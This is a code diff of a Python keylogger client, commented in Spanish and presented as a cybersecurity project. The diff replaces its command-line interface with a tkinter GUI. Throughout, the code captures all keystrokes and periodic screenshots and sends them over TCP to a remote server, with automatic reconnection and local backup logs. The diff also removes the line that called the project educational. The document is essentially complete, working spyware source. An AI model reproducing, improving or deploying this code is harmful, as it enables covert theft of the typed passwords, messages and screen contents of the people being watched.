@@ -1,11 +1,7 @@
 #!/usr/bin/env python3
 """
 =============================================================
-  CLIENTE KEYLOGGER - Proyecto de Ciberseguridad (Educativo)
-=============================================================
-  Captura teclas y screenshots en la máquina "víctima".
-  Envía los datos al servidor vía TCP.
-  También almacena un log local de respaldo.
+  CLIENTE KEYLOGGER CON GUI - Proyecto de Ciberseguridad
 =============================================================
 """
 
@@ -15,130 +11,250 @@ import io
 import os
 import sys
 import time
-import argparse
 import threading
+import tkinter as tk
+from tkinter import scrolledtext, messagebox
 from datetime import datetime
 
 try:
     from pynput import keyboard
 except ImportError:
-    print("[!] Error: Instala pynput → pip install pynput")
+    print("[!] Instala pynput: pip install pynput")
     sys.exit(1)
 
 try:
     from PIL import ImageGrab
 except ImportError:
-    print("[!] Error: Instala Pillow → pip install Pillow")
+    print("[!] Instala Pillow: pip install Pillow")
     sys.exit(1)
 
 # ── Configuración por defecto ──────────────────────────────
-DEFAULT_HOST = "127.0.0.1"
+DEFAULT_HOST = "192.168.50.76"
 DEFAULT_PORT = 9999
-SCREENSHOT_INTERVAL = 60        # Segundos entre capturas
-KEY_BUFFER_FLUSH_INTERVAL = 5   # Segundos para enviar buffer de teclas
+SCREENSHOT_INTERVAL = 60
+KEY_BUFFER_FLUSH_INTERVAL = 5
 LOCAL_LOG_FILE = "local_log.txt"
 
 
-class KeyloggerClient:
-    """Cliente que captura teclas y screenshots y los envía al servidor."""
+class ClientGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("👁 Cliente Keylogger - Ciberseguridad")
+        self.root.geometry("750x580")
+        self.root.configure(bg="#1a1a2e")
+        self.root.resizable(True, True)
 
-    def __init__(self, host, port, screenshot_interval, local_log):
-        self.host = host
-        self.port = port
-        self.screenshot_interval = screenshot_interval
-        self.local_log = local_log
-
-        self.socket = None
+        self.sock = None
         self.connected = False
-        self.running = True
+        self.running = False
+        self.listener = None
 
-        # Buffer de teclas con lock para thread-safety
         self.key_buffer = []
         self.buffer_lock = threading.Lock()
 
+        self.keys_sent = 0
+        self.screenshots_sent = 0
+
+        self.build_gui()
+
+    # ── GUI ────────────────────────────────────────────────
+
+    def build_gui(self):
+        bg = "#1a1a2e"
+        fg = "#e0e0e0"
+        accent = "#e94560"
+        entry_bg = "#16213e"
+
+        # Header
+        header = tk.Frame(self.root, bg=accent, pady=10)
+        header.pack(fill=tk.X)
+
+        tk.Label(
+            header, text="👁 CLIENTE KEYLOGGER",
+            font=("Helvetica", 18, "bold"), bg=accent, fg="white"
+        ).pack()
+
+        # ── Configuración de conexión ──────────────────────
+        config_frame = tk.LabelFrame(
+            self.root, text=" 🔗 Conexión al Servidor ",
+            font=("Helvetica", 11, "bold"),
+            bg=bg, fg=fg, padx=10, pady=8
+        )
+        config_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
+
+        row1 = tk.Frame(config_frame, bg=bg)
+        row1.pack(fill=tk.X, pady=2)
+
+        tk.Label(row1, text="IP Servidor:", bg=bg, fg=fg,
+                 font=("Helvetica", 10)).pack(side=tk.LEFT)
+        self.host_entry = tk.Entry(row1, width=18, bg=entry_bg, fg="#00d2ff",
+                                   insertbackground=fg, font=("Courier", 11, "bold"))
+        self.host_entry.insert(0, DEFAULT_HOST)
+        self.host_entry.pack(side=tk.LEFT, padx=(5, 20))
+
+        tk.Label(row1, text="Puerto:", bg=bg, fg=fg,
+                 font=("Helvetica", 10)).pack(side=tk.LEFT)
+        self.port_entry = tk.Entry(row1, width=8, bg=entry_bg, fg=fg,
+                                   insertbackground=fg, font=("Courier", 10))
+        self.port_entry.insert(0, str(DEFAULT_PORT))
+        self.port_entry.pack(side=tk.LEFT, padx=5)
+
+        # Fila 2: Intervalo de screenshots
+        row2 = tk.Frame(config_frame, bg=bg)
+        row2.pack(fill=tk.X, pady=2)
+
+        tk.Label(row2, text="Screenshots cada:", bg=bg, fg=fg,
+                 font=("Helvetica", 10)).pack(side=tk.LEFT)
+        self.interval_entry = tk.Entry(row2, width=5, bg=entry_bg, fg=fg,
+                                       insertbackground=fg, font=("Courier", 10))
+        self.interval_entry.insert(0, str(SCREENSHOT_INTERVAL))
+        self.interval_entry.pack(side=tk.LEFT, padx=5)
+        tk.Label(row2, text="segundos", bg=bg, fg="#aaa",
+                 font=("Helvetica", 10)).pack(side=tk.LEFT)
+
+        # ── Botones ────────────────────────────────────────
+        btn_frame = tk.Frame(self.root, bg=bg)
+        btn_frame.pack(fill=tk.X, padx=10, pady=5)
+
+        self.start_btn = tk.Button(
+            btn_frame, text="▶ CONECTAR E INICIAR",
+            font=("Helvetica", 12, "bold"),
+            bg="#28a745", fg="white", activebackground="#218838",
+            cursor="hand2", padx=20, pady=5,
+            command=self.start_client
+        )
+        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))
+
+        self.stop_btn = tk.Button(
+            btn_frame, text="⏹ DETENER",
+            font=("Helvetica", 12, "bold"),
+            bg=accent, fg="white", activebackground="#c82333",
+            cursor="hand2", padx=20, pady=5,
+            state=tk.DISABLED,
+            command=self.stop_client
+        )
+        self.stop_btn.pack(side=tk.LEFT)
+
+        # Status
+        self.status_label = tk.Label(
+            btn_frame, text="● Desconectado",
+            font=("Helvetica", 11), bg=bg, fg="#ff6b6b"
+        )
+        self.status_label.pack(side=tk.RIGHT, padx=10)
+
+        # ── Estadísticas ───────────────────────────────────
+        stats_frame = tk.Frame(self.root, bg=bg)
+        stats_frame.pack(fill=tk.X, padx=10, pady=2)
+
+        self.stats_label = tk.Label(
+            stats_frame,
+            text="⌨ Envíos de teclas: 0   |   📷 Screenshots: 0",
+            font=("Helvetica", 10), bg=bg, fg="#aaa"
+        )
+        self.stats_label.pack(side=tk.LEFT)
+
+        # ── Log ────────────────────────────────────────────
+        log_label = tk.Label(
+            self.root, text="📋 Actividad:",
+            font=("Helvetica", 11, "bold"), bg=bg, fg=fg, anchor="w"
+        )
+        log_label.pack(fill=tk.X, padx=10, pady=(10, 2))
+
+        self.log_text = scrolledtext.ScrolledText(
+            self.root, width=80, height=16,
+            bg="#0d1117", fg="#58a6ff",
+            insertbackground=fg, font=("Courier", 10),
+            state=tk.DISABLED, wrap=tk.WORD
+        )
+        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
+
+        self.log_text.tag_config("info", foreground="#58a6ff")
+        self.log_text.tag_config("success", foreground="#3fb950")
+        self.log_text.tag_config("warning", foreground="#d29922")
+        self.log_text.tag_config("error", foreground="#f85149")
+        self.log_text.tag_config("key", foreground="#bc8cff")
+        self.log_text.tag_config("screenshot", foreground="#79c0ff")
+
+    # ── Logging ────────────────────────────────────────────
+
+    def log(self, message, tag="info"):
+        ts = datetime.now().strftime("%H:%M:%S")
+        self.root.after(0, self._append_log, f"[{ts}] {message}\n", tag)
+
+    def _append_log(self, text, tag):
+        self.log_text.config(state=tk.NORMAL)
+        self.log_text.insert(tk.END, text, tag)
+        self.log_text.see(tk.END)
+        self.log_text.config(state=tk.DISABLED)
+
+    def update_stats(self):
+        self.root.after(0, self.stats_label.config, {
+            "text": f"⌨ Envíos de teclas: {self.keys_sent}   |   📷 Screenshots: {self.screenshots_sent}"
+        })
+
+    # ── Conexión ───────────────────────────────────────────
+
     def connect(self):
-        """Establece conexión TCP con el servidor."""
         try:
-            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.connect((self.host, self.port))
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            host = self.host_entry.get().strip()
+            port = int(self.port_entry.get().strip())
+            self.sock.connect((host, port))
             self.connected = True
-            print(f"[+] Conectado al servidor {self.host}:{self.port}")
+            self.log(f"✅ Conectado a {host}:{port}", "success")
+            self.root.after(0, self.status_label.config,
+                            {"text": "● Conectado", "fg": "#3fb950"})
             return True
         except Exception as e:
-            print(f"[!] Error de conexión: {e}")
+            self.log(f"Error de conexión: {e}", "error")
             self.connected = False
             return False
 
     def reconnect(self):
-        """Intenta reconectar al servidor con backoff exponencial."""
         delay = 5
-        max_delay = 60
         while self.running and not self.connected:
-            print(f"[*] Reintentando conexión en {delay}s...")
+            self.log(f"Reintentando en {delay}s...", "warning")
             time.sleep(delay)
             if self.connect():
                 return True
-            delay = min(delay * 2, max_delay)
+            delay = min(delay * 2, 60)
         return False
 
     def send_data(self, msg_type, payload, filename=None):
-        """
-        Envía datos al servidor con el protocolo de header JSON + payload.
-        Retorna True si se envió correctamente.
-        """
         if not self.connected:
             return False
-
         try:
-            header = {
-                "type": msg_type,
-                "size": len(payload),
-            }
+            header = {"type": msg_type, "size": len(payload)}
             if filename:
                 header["filename"] = filename
-
             header_json = json.dumps(header).encode("utf-8") + b"\n"
-            self.socket.sendall(header_json + payload)
+            self.sock.sendall(header_json + payload)
             return True
-
         except (BrokenPipeError, ConnectionResetError, OSError) as e:
-            print(f"[!] Error de envío: {e}")
+            self.log(f"Error de envío: {e}", "error")
             self.connected = False
+            self.root.after(0, self.status_label.config,
+                            {"text": "● Reconectando...", "fg": "#d29922"})
             return False
 
-    def write_local_log(self, text):
-        """Escribe teclas capturadas en el archivo local de respaldo."""
-        try:
-            with open(self.local_log, "a", encoding="utf-8") as f:
-                ts = datetime.now().strftime("%H:%M:%S")
-                f.write(f"[{ts}] {text}\n")
-        except Exception as e:
-            print(f"[!] Error escribiendo log local: {e}")
-
-    # ── Captura de Teclas ──────────────────────────────────
+    # ── Captura de teclas ──────────────────────────────────
 
     def on_key_press(self, key):
-        """Callback para cada tecla presionada."""
         try:
-            # Teclas especiales
             special_keys = {
                 keyboard.Key.space: " ",
                 keyboard.Key.enter: "[ENTER]\n",
                 keyboard.Key.tab: "[TAB]",
                 keyboard.Key.backspace: "[BACKSPACE]",
                 keyboard.Key.delete: "[DELETE]",
-                keyboard.Key.shift: "[SHIFT]",
-                keyboard.Key.shift_r: "[SHIFT_R]",
+                keyboard.Key.shift: "",
+                keyboard.Key.shift_r: "",
                 keyboard.Key.ctrl_l: "[CTRL]",
                 keyboard.Key.ctrl_r: "[CTRL_R]",
                 keyboard.Key.alt_l: "[ALT]",
                 keyboard.Key.alt_r: "[ALT_R]",
                 keyboard.Key.caps_lock: "[CAPS]",
                 keyboard.Key.esc: "[ESC]",
-                keyboard.Key.up: "[↑]",
-                keyboard.Key.down: "[↓]",
-                keyboard.Key.left: "[←]",
-                keyboard.Key.right: "[→]",
             }
 
             if key in special_keys:
@@ -148,14 +264,13 @@ class KeyloggerClient:
             else:
                 char = f"[{key}]"
 
-            with self.buffer_lock:
-                self.key_buffer.append(char)
-
+            if char:
+                with self.buffer_lock:
+                    self.key_buffer.append(char)
         except Exception:
             pass
 
     def flush_key_buffer(self):
-        """Envía el contenido del buffer de teclas al servidor periódicamente."""
         while self.running:
             time.sleep(KEY_BUFFER_FLUSH_INTERVAL)
 
@@ -165,163 +280,148 @@ class KeyloggerClient:
                 keys_text = "".join(self.key_buffer)
                 self.key_buffer.clear()
 
-            # Guardar en log local
+            # Log local
             self.write_local_log(keys_text)
 
-            # Enviar al servidor
+            # Enviar
             if self.connected:
                 payload = keys_text.encode("utf-8")
-                if not self.send_data("keys", payload):
-                    # Intentar reconectar en background
-                    threading.Thread(
-                        target=self.reconnect, daemon=True
-                    ).start()
+                if self.send_data("keys", payload):
+                    self.keys_sent += 1
+                    self.update_stats()
+                    display = keys_text.replace("\n", "↵")
+                    if len(display) > 50:
+                        display = display[:50] + "..."
+                    self.log(f"⌨ Teclas enviadas: {display}", "key")
+                else:
+                    threading.Thread(target=self.reconnect, daemon=True).start()
 
-    # ── Capturas de Pantalla ───────────────────────────────
-
-    def capture_screenshot(self):
-        """Captura la pantalla y retorna los bytes PNG."""
+    def write_local_log(self, text):
         try:
-            screenshot = ImageGrab.grab()
-            buffer = io.BytesIO()
-            screenshot.save(buffer, format="PNG")
-            return buffer.getvalue()
-        except Exception as e:
-            print(f"[!] Error capturando pantalla: {e}")
-            return None
+            with open(LOCAL_LOG_FILE, "a", encoding="utf-8") as f:
+                ts = datetime.now().strftime("%H:%M:%S")
+                f.write(f"[{ts}] {text}\n")
+        except Exception:
+            pass
+
+    # ── Screenshots ────────────────────────────────────────
 
     def screenshot_loop(self):
-        """Captura y envía screenshots periódicamente."""
-        while self.running:
-            time.sleep(self.screenshot_interval)
+        try:
+            interval = int(self.interval_entry.get().strip())
+        except ValueError:
+            interval = SCREENSHOT_INTERVAL
 
-            img_data = self.capture_screenshot()
-            if img_data is None:
+        while self.running:
+            time.sleep(interval)
+            if not self.running:
+                break
+
+            try:
+                screenshot = ImageGrab.grab()
+                buffer = io.BytesIO()
+                screenshot.save(buffer, format="PNG")
+                img_data = buffer.getvalue()
+            except Exception as e:
+                self.log(f"Error capturando pantalla: {e}", "error")
                 continue
 
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"screenshot_{timestamp}.png"
-
-            print(f"[📷] Captura tomada: {filename} ({len(img_data)} bytes)")
+            size_kb = len(img_data) / 1024
 
             if self.connected:
-                if not self.send_data("screenshot", img_data, filename):
-                    # Guardar localmente si no se puede enviar
+                if self.send_data("screenshot", img_data, filename):
+                    self.screenshots_sent += 1
+                    self.update_stats()
+                    self.log(f"📷 Screenshot enviado: {filename} ({size_kb:.1f} KB)", "screenshot")
+                else:
                     self.save_screenshot_local(img_data, filename)
-                    threading.Thread(
-                        target=self.reconnect, daemon=True
-                    ).start()
+                    threading.Thread(target=self.reconnect, daemon=True).start()
             else:
                 self.save_screenshot_local(img_data, filename)
 
     def save_screenshot_local(self, img_data, filename):
-        """Guarda screenshot localmente si no hay conexión al servidor."""
-        local_ss_dir = "local_screenshots"
-        os.makedirs(local_ss_dir, exist_ok=True)
-        path = os.path.join(local_ss_dir, filename)
+        local_dir = "local_screenshots"
+        os.makedirs(local_dir, exist_ok=True)
+        path = os.path.join(local_dir, filename)
         try:
             with open(path, "wb") as f:
                 f.write(img_data)
-            print(f"[💾] Screenshot guardado localmente: {path}")
+            self.log(f"💾 Guardado local: {filename}", "warning")
         except Exception as e:
-            print(f"[!] Error guardando screenshot local: {e}")
+            self.log(f"Error guardando local: {e}", "error")
 
-    # ── Inicio y Control ───────────────────────────────────
+    # ── Control ────────────────────────────────────────────
 
-    def start(self):
-        """Inicia el cliente keylogger."""
-        print(f"\n{'='*55}")
-        print(f"  CLIENTE KEYLOGGER ACTIVO")
-        print(f"{'='*55}")
-        print(f"  Servidor:    {self.host}:{self.port}")
-        print(f"  Screenshots: cada {self.screenshot_interval}s")
-        print(f"  Log local:   {self.local_log}")
-        print(f"{'='*55}")
+    def start_client(self):
+        self.running = True
+        self.keys_sent = 0
+        self.screenshots_sent = 0
 
-        # Conectar al servidor
+        self.start_btn.config(state=tk.DISABLED)
+        self.stop_btn.config(state=tk.NORMAL)
+        self.host_entry.config(state=tk.DISABLED)
+        self.port_entry.config(state=tk.DISABLED)
+        self.interval_entry.config(state=tk.DISABLED)
+
+        self.log("Iniciando cliente...", "info")
+
+        threading.Thread(target=self._start_worker, daemon=True).start()
+
+    def _start_worker(self):
+        # Conectar
         if not self.connect():
-            print("[*] Ejecutando en modo offline, reintentando conexión...")
+            self.log("Modo offline, reintentando...", "warning")
             threading.Thread(target=self.reconnect, daemon=True).start()
 
-        # Hilo para enviar buffer de teclas
-        key_flush_thread = threading.Thread(
-            target=self.flush_key_buffer, daemon=True
-        )
-        key_flush_thread.start()
+        # Hilo flush de teclas
+        threading.Thread(target=self.flush_key_buffer, daemon=True).start()
 
-        # Hilo para capturas de pantalla
-        screenshot_thread = threading.Thread(
-            target=self.screenshot_loop, daemon=True
-        )
-        screenshot_thread.start()
+        # Hilo screenshots
+        threading.Thread(target=self.screenshot_loop, daemon=True).start()
 
-        # Listener de teclado (bloquea el hilo principal)
-        print("[*] Capturando teclas... (Ctrl+C para detener)\n")
-        try:
-            with keyboard.Listener(on_press=self.on_key_press) as listener:
-                listener.join()
-        except KeyboardInterrupt:
-            pass
-        finally:
-            self.stop()
+        # Listener de teclado
+        self.log("Capturando teclas...", "success")
+        self.listener = keyboard.Listener(on_press=self.on_key_press)
+        self.listener.start()
 
-    def stop(self):
-        """Detiene el cliente y cierra conexiones."""
-        print("\n[*] Deteniendo cliente...")
+    def stop_client(self):
         self.running = False
+        self.log("Deteniendo cliente...", "warning")
 
-        # Enviar teclas restantes en el buffer
+        if self.listener:
+            self.listener.stop()
+
+        # Flush remaining
         with self.buffer_lock:
             if self.key_buffer:
                 remaining = "".join(self.key_buffer)
                 self.write_local_log(remaining)
-                if self.connected:
-                    self.send_data("keys", remaining.encode("utf-8"))
                 self.key_buffer.clear()
 
-        if self.socket:
+        if self.sock:
             try:
-                self.socket.close()
+                self.sock.close()
             except Exception:
                 pass
+        self.connected = False
 
-        print("[*] Cliente detenido.")
+        self.start_btn.config(state=tk.NORMAL)
+        self.stop_btn.config(state=tk.DISABLED)
+        self.host_entry.config(state=tk.NORMAL)
+        self.port_entry.config(state=tk.NORMAL)
+        self.interval_entry.config(state=tk.NORMAL)
+        self.status_label.config(text="● Desconectado", fg="#ff6b6b")
+
+        self.log("Cliente detenido.", "warning")
 
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Cliente Keylogger - Proyecto Educativo de Ciberseguridad"
-    )
-    parser.add_argument(
-        "--host", default=DEFAULT_HOST,
-        help=f"IP del servidor (default: {DEFAULT_HOST})"
-    )
-    parser.add_argument(
-        "--port", "-p", type=int, default=DEFAULT_PORT,
-        help=f"Puerto del servidor (default: {DEFAULT_PORT})"
-    )
-    parser.add_argument(
-        "--interval", "-i", type=int, default=SCREENSHOT_INTERVAL,
-        help=f"Intervalo de screenshots en segundos (default: {SCREENSHOT_INTERVAL})"
-    )
-    parser.add_argument(
-        "--log", default=LOCAL_LOG_FILE,
-        help=f"Archivo de log local (default: {LOCAL_LOG_FILE})"
-    )
-
-    args = parser.parse_args()
-
-    client = KeyloggerClient(
-        host=args.host,
-        port=args.port,
-        screenshot_interval=args.interval,
-        local_log=args.log
-    )
-
-    try:
-        client.start()
-    except KeyboardInterrupt:
-        client.stop()
+    root = tk.Tk()
+    app = ClientGUI(root)
+    root.protocol("WM_DELETE_WINDOW", lambda: (app.stop_client(), root.destroy()))
+    root.mainloop()
 
 
 if __name__ == "__main__":
